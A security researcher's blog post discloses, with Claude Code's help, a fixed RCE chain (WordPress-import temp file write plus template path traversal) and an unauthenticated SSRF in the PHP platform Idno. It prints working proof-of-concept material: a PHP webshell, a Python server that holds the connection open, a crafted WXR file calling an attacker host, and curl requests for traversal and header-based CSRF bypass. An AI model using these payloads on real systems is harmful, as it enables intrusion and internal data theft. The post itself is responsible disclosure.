---
title: "Clauding My Way Into CVEs in Idno"
date: 2026-03-06T19:28:44-08:00
draft: false
toc: true
images:
tags:
  - php
  - cve-analysis
---

Idno is a PHP social publishing platform - the kind of thing you self-host when you want to own your content. I found three vulnerabilities in it. Two chain into remote code execution: a web application admin can get the server to write an attacker-controlled PHP file to the server's temp directory during WordPress import processing, and then any authenticated user can include that file via an unsanitized template name parameter. The third is a standalone unauthenticated SSRF caused by a logic error in the API authentication flow that allows bypassing CSRF protection with a pair of crafted header values. 
* The RCE was assigned [CVE-2026-28507](https://github.com/advisories/GHSA-37j7-56xc-c468) and has a CVSS v4.0 score of 8.6 ([AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N)); 

* The SSRF was assigned [CVE-2026-28508](https://github.com/advisories/GHSA-fcrh-fqxh-6fx6) and has a CVSS v4.0 score of 9.2 ([AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N)).

Both issues are fixed in Idno versions: >= 1.6.4.
## AI-ifying Vulnerability Discovery

In my [last post](https://www.baishya.xyz/posts/nicegui-xss/) I outlined my usual security research workflow - run Semgrep on a codebase first and then use Claude Code to triage the interesting findings. I also said 
>You may ask why not just have Claude code review the repo

and also
>The truth is, I don’t want to spend $100-$200 a month on a Claude subscription. I currently have a $20 subscription

But the thought kept running in my head. What is the worse that could happen if I did just ask Claude to review the repo? I would run out of tokens and find no leads. Given that once my plan limits are reached, Claude just stops - this is a pretty benign outcome. The limit is reset in a few hours anyway.

So with Idno I did just that. I pointed Claude Code at the repository and asked it to go through the code methodically - every API endpoint, every user-accessible code path - and surface anything that looked like it could lead to a high-value vulnerability: RCE, SQL injection, SSRF, command injection, file inclusion. No Semgrep scan first; just a structured ask to look at the code the way a researcher would.

Claude flibbertigibbeted, bloviated, and billowed for a few minutes and  came back with a ranked list of suspicious areas. Some of these were:
1. WordPress import flow with `basename()` called on a raw URL, writing to a predictable temp file, with cleanup that only happens after the stream closes.
2. The user search endpoint's template parameter being vulnerable to path traversal
3. API session flag in `Session.php` being set before the HMAC verification completed.

## RCE: Chained Import File Write and Template Path Traversal

From Claude's response, I guessed that if 
1. I can write anything to a predictable file path using finding (1)
2. I can render any file using the path traversal from finding (2)  

I can potentially write and execute a web shell.

### Arbitrary File Write via WordPress Import

The first vulnerability is in `Idno/Core/Migration.php`, inside `importImagesFromBodyHTML()`. When a WordPress WXR file is imported, this function walks the `<img>` tags in post bodies, fetches each image URL, and re-hosts the file locally. The temp filename is constructed as:

```php
$name = md5($src);
$newname = $dir . $name . basename($src);
```

`$src` is the raw image URL from the XML, and `basename($src)` is applied to it as a string - so the extension of the temp file is whatever the URL ends in, with no validation. If the URL ends in `.tpl.php`, so does the temp file.

Before fetching, the URL goes through a filter:

```php
if (substr_count($src, $src_url)) {
```

where `$src_url` is the hardcoded string `wordpress.com`. This uses `substr_count` on the full URL string rather than parsing out the hostname. Therefore, this check can be bypassed by including `wordpress` in a path component like `http://attacker.com/wordpress.com/shell.tpl.php`.

The write itself:

```php
if (@file_put_contents($newname, fopen($src, 'r'))) {
```

`fopen($src, 'r')` opens a stream to the attacker's server. `file_put_contents` reads from it and writes to disk. The temp file is only cleaned up *after* `file_put_contents` returns, back up the call stack:

```php
if ($file = File::createFromFile($newname, basename($src), $mime, true)) {
    $newsrc = ...;
    @unlink($newname);  // only runs after file_put_contents completes
}
```

This creates a timing window. If my server sends the PHP payload and then holds the TCP connection open, `file_put_contents` blocks. The file sits on disk as long as the I want it to. The `@unlink` does not run until the I release the connection.

The import endpoint itself adds a 10-second background delay before any of this starts, but this would work even if it did not. I can create an endpoint on my server like
```python
def do_GET(self):
    self.send_response(200)
    self.send_header("Content-Type", "application/octet-stream")
    self.end_headers()
    self.wfile.write(PAYLOAD)
    self.wfile.flush()
    print(f"[*] Payload sent. Holding connection open...")
    time.sleep(45)  # hold connection open for 45s
    print(f"[*] Connection released")
```

which blocks for 45 seconds (or as long as I want it to). `file_put_contents` will wait until the connection is closed.

The resulting file containing the payload is created in PHP's temp directory - typically `/tmp`, or on systemd-managed Apache a private mount at `/tmp/systemd-private-{id}-apache2.service-{id}/tmp/`. The filename is fully predictable: `md5($full_url) . basename($url)`.

There are two prerequisites for this to work:
* the Text plugin must be enabled (the import returns early without it, though it appears to be on by default)
* `allow_url_fopen` must be enabled in PHP (also the default).

### LFI via Template Name Parameter

The second vulnerability is in the user search endpoint. `Idno/Pages/Search/User.php` accepts a `template` GET parameter and passes it to the template rendering engine:

```php
$template = $this->getInput('template', 'forms/components/usersearch/user');
// ...
$t = new \Idno\Core\DefaultTemplate();
$results['rendered'] .= $t->__(['user' => $user])->draw($template);
```

`draw()` in `Idno/Core/Bonita/Templates.php` applies a regex to the template name:

```php
function draw($templateName, $returnBlank = true)
{
    $templateName = preg_replace('/^_[A-Z0-9\/]+/i', '', $templateName);
```

This strips strings beginning with an underscore followed by alphanumeric characters, but does not restrict `../` sequences or path separators. The name is then joined with a base path and template type directory to construct the include path:

```php
$path = $basepath . '/templates/' . $templateType . '/' . $templateName . '.tpl.php';
if (file_exists($path)) {
    $fn = (function ($path, $vars, $t) {
        foreach ($vars as $k => $v) { ${$k} = $v; }
        ob_start();
        include $path;
        return ob_get_clean();
    });
    return $fn($path, $this->vars, $this);
}
```

The template type comes from `detectDevice()`, which reads the `User-Agent` header and returns `default` for any standard desktop browser. There is a `_t` query parameter intended to override the template type, but it sets the type on the *global* site template object - not on the locally constructed `$t` instance - so it has no effect on the include path used here. For a desktop browser, the resolved path is always:

```
/var/www/html/idno/templates/default/{template}.tpl.php
```

Supplying `template=../../../../../../tmp/{filename}` resolves to `/tmp/{filename}.tpl.php`. Because PHP's `$_GET` superglobal is accessible from any scope including inside `include`d files, code in the included file can read the original request's query parameters directly without anything being explicitly passed.

The endpoint is gated by `gatekeeper()`, which only checks `isLoggedIn()`. Any authenticated user - not just the admin - can trigger it.

### Chaining It Together

This is a great example of the swiss cheese model of safety. The admin half writes a PHP webshell to a predictable location in `/tmp` while holding the TCP connection open. The user half includes it before the connection is released and the file deleted. When it's done, there's nothing left on disk.

```
┌────────────────────────────────────────────────────────────────────┐
│ 1. Admin submits crafted WXR to POST /admin/import/                │
│    <img src="http://attacker.com/wordpress.com/shell.tpl.php">     │
└────────────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────────────┐
│ 2. importImagesFromBodyHTML() runs                                 │
│    - substr_count passes ('wordpress.com' in URL path)             │
│    - fopen() connects to attacker server                           │
│    - Attacker sends PHP payload, holds TCP connection open         │
│    - file_put_contents writes /tmp/594a...shell.tpl.php and blocks │
└────────────────────────────────────────────────────────────────────┘
                (file on disk, connection still held)
┌────────────────────────────────────────────────────────────────────┐
│ 3. Any authenticated user sends:                                   │
│    GET /search/users/?query=a&limit=1&                             │
│        template=../../../../../../tmp/594ac64...shell&cmd=id       │
└────────────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────────────┐
│ 4. draw() resolves path → /tmp/594ac64...shell.tpl.php             │
│    file_exists() is true → include executes the webshell           │
│    system($_GET['cmd']) runs, output in JSON 'rendered' field      │
└────────────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────────────┐
│ 5. Attacker closes connection → file_put_contents returns          │
│    @unlink removes the temp file - no artefact remains             │
└────────────────────────────────────────────────────────────────────┘
```

### Proof of Concept

**Step 1.** Create the WXR import file:

```xml
<rss version="2.0"
    xmlns:content="http://purl.org/rss/1.0/modules/content/"
    xmlns:wp="http://wordpress.org/export/1.2/">
    <channel>
      <item>
        <title>Test Post</title>
        <wp:post_type>post</wp:post_type>
        <wp:status>publish</wp:status>
        <content:encoded><![CDATA[<img
  src="http://attacker-server-address/wordpress.com/shell.tpl.php">]]></content:encoded>
      </item>
    </channel>
</rss>
```

**Step 2.** Run an HTTP server that sends the payload and then holds the connection open:

```python
import http.server
import time

PAYLOAD = b'<?php system($_GET["cmd"]); ?>'


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers()
        self.wfile.write(PAYLOAD)
        self.wfile.flush()
        print(f"[*] Payload sent. Holding connection open...")
        time.sleep(45)  # hold connection open for 45s
        print(f"[*] Connection released")

    def log_message(self, fmt, *args):
        print(fmt % args)


http.server.HTTPServer(("0.0.0.0", 9876), Handler).serve_forever()
```

The file served at path `wordpress.com/shell.tpl.php`:

```php
<?php system($_GET[0]); ?>
```

**Step 3.** Submit the WXR to `http://idno-address/admin/import/` using the WordPress import option. Wait until the attacker server receives an inbound connection - the import runs 10 seconds after the browser redirect.

**Step 4.** Compute the MD5 of the full payload URL. Suppose the that is `594ac6416712b71b978fa4659c4298c3`, then the temp file is `594ac6416712b71b978fa4659c4298c3shell.tpl.php`.

**Step 5.** While the connection is still held open, trigger the LFI as any authenticated user:

```
curl -k \
  -b "idno=<cookie>" \
  "http://idno-address/search/users/?query=a&limit=1&template=../../../../../../tmp/594ac6416712b71b978fa4659c4298c3shell&cmd=id"
```

Response:

```
{"count":1,"rendered":"uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(pihole)\n"}
```

## Unauthenticated SSRF via URL Unfurl Endpoint

The SSRF is a simpler bug, but also a great example of the swiss cheese model of safety (I have been watching a lot of Air Crash Investigation lately and hence this reference). The URL unfurl endpoint - `GET /service/web/unfurl?url=<url>` in `Idno/Pages/Service/Web/UrlUnfurl.php` has a pattern I look into very often - calling an user supplied URL. I wanted to see if there are any allowlists or denylists that prevent reaching internal services.

I discovered that this endpoint is supposed to be protected by a login check, an XHR check, and a CSRF token check. Asking Claude to review the implementation of these checks showed there is a logic error that allowed all three to be bypassed with a pair of crafted header values.

### The Authentication Flow

The endpoint's access controls are:

```php
$this->xhrGatekeeper();
$this->tokenGatekeeper();
```

The original `$this->gatekeeper()` login check was explicitly removed, with this comment left in the source:

```php
//$this->gatekeeper(); // Gatekeeper to ensure this service isn't abused by third parties
// UPDATE: Needs to be accessible to logged out users, TODO, find a way to prevent abuse
```

So unauthenticated access is the intended (if provisional) state. The remaining two gatekeepers are supposed to compensate.

Bypassing `xhrGatekeeper()` is trivial - it only checks for `X-Requested-With: XMLHttpRequest`, which any HTTP client can set:

```php
function xhrGatekeeper()
{
    if (!$this->xhr) {
        $this->deniedContent();
    }
}
```

Bypassing `tokenGatekeeper()` is more interesting. It calls `Actions::validateToken()`, which short-circuits entirely when `isAPIRequest()` returns true:

```php
public static function validateToken($action = '', $haltExecutionOnBadRequest = true)
{
    if (Idno::site()->session()->isAPIRequest()) {
        return true;
    }
    return parent::validateToken($action, $haltExecutionOnBadRequest);
}
```

`isAPIRequest()` reads a session flag:

```php
function isAPIRequest()
{
    if (!empty($_SESSION['is_api_request'])) {
        return true;
    }
    return false;
}
```

That flag is set in `Session::tryAuthUser()`, which runs early in the request lifecycle. Here is the defect:

```php
$apiUsername  = $_SERVER['HTTP_X_IDNO_USERNAME']  ?? $_SERVER['HTTP_X_KNOWN_USERNAME']  ?? null;
$apiSignature = $_SERVER['HTTP_X_IDNO_SIGNATURE'] ?? $_SERVER['HTTP_X_KNOWN_SIGNATURE'] ?? null;
if (!$return && !empty($apiUsername) && !empty($apiSignature)) {
    $this->setIsAPIRequest(true);   // ← flag set here, before any credential check
    $user = \Idno\Entities\User::getByHandle($apiUsername);
    if (!empty($user)) {
        $compare_hmac = base64_encode(hash_hmac('sha256', $_SERVER['REQUEST_URI'], $key, true));
        if ($hmac == $compare_hmac) {       // ← HMAC verified here, too late
            $return = $this->refreshSessionUser($user);
        }
    }
}
```

`setIsAPIRequest(true)` is called unconditionally as soon as both `X-IDNO-USERNAME` and `X-IDNO-SIGNATURE` headers are present - regardless of whether the values are valid. The HMAC check that follows doesn't matter. By the time `tokenGatekeeper()` calls `validateToken()`, the API flag is already set and the token check returns true immediately. Any non-empty values for those two headers - real or invented - bypass CSRF protection entirely.

### The Unfurl

With both gatekeepers bypassed, execution reaches `UnfurledUrl::unfurl()`:

```php
public function unfurl($url)
{
    $url = trim($url);
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }
    $contents = \Idno\Core\Webservice::file_get_contents($url);
    ...
    $this->data = $unfurled;
    $this->source_url = $url;
    return true;
}
```

`FILTER_VALIDATE_URL` accepts `http://localhost/`, `http://169.254.169.254/`, `http://10.0.0.1/`, and anything else that is structurally a valid URL. There is no allowlist, denylist, or restriction on private or loopback address ranges. The fetched content is parsed for OpenGraph metadata and microformats and returned in a JSON response - giving an attacker a full read of the response body from whatever internal host was targeted.

### Proof of Concept

**Step 1.** Start a local HTTP server on the Idno host to simulate an internal service:

```
python -m http.server --bind 127.0.0.1 9001
Serving HTTP on 127.0.0.1 port 9001 (http://127.0.0.1:9001/) ...
```

**Step 2.** Confirm it is not reachable from the outside:

```
curl http://rpi:9001
curl: (7) Failed to connect to rpi port 9001 after 26 ms: Couldn't connect to server
```

**Step 3.** Hit the unfurl endpoint with the required headers:

```sh
curl -s "http://rpi:9090/service/web/unfurl?url=http://localhost:9001/test.html" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "X-IDNO-USERNAME: x" \
    -H "X-IDNO-SIGNATURE: x"
```

Response:

```json
{
    "title": "Page Title",
    "mf2": {
        "items": [],
        "rels": [],
        "rel-urls": []
    },
    "id": null,
    "rendered": "<div class=\"row unfurled-url\" ...><h3><a href=\"http://localhost:9001/test.html\">Page Title</a></h3>...</div>"
}
```

The server fetched and returned content from a port that was not externally reachable.

### Timeline
* February 17, 2026: Reported the SSRF issue to Idno maintainers via email. Got an email bounce stating the security email address is invalid. Reported using GitHub's report vulnerability option instead.
* February 18, 2026: Reported the RCE issue directly through GitHub's report vulnerability option.
* February 25, 2026: Created a GitHub issue stating that the security email is not working.
* February 28, 2026: Maintainers informed me that the security email should be working now.
* February 28, 2026: Resent the reports via email.
* February 28, 2026: Maintainers acknowledged report and fixed the vulnerabilties. Shoutout to the maintainers for fixing the issues in a very short time.

Side note: Looking at the fixes, I found that the fixes were added by Claude. So this entire experience is basically one Claude talking to another Claude through humans.

That's all folks! See you in the next one. Thanks for reading!